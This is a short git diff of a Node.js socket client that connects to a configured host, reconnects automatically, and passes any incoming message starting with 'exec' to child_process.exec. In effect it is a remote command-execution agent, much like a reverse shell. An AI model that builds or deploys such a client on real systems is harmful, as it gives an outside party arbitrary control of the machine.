@@ -4,6 +4,7 @@ import child_process from "child_process";
 import process from "process";
 import changeDir from "./shell.js"
 import dotenv from "dotenv";
+
 dotenv.config({ path: "../config/.env" });
 
 const exec = util.promisify(child_process.exec);
@@ -16,7 +17,7 @@ const client = new net.Socket();
 
 function reconnect(timeout) {
 	setTimeout(() => {
-		// console.log("retrying...");
+		client.destroy();
 		client.connect(PORT, HOST);
 	}, timeout);
 }
@@ -36,6 +37,7 @@ client.on("data", (data) => {
 			}
 		);
 	}
+
 	if (dataStr.startsWith("exec")) execute(dataStr.replace("exec", ""));
 });
 
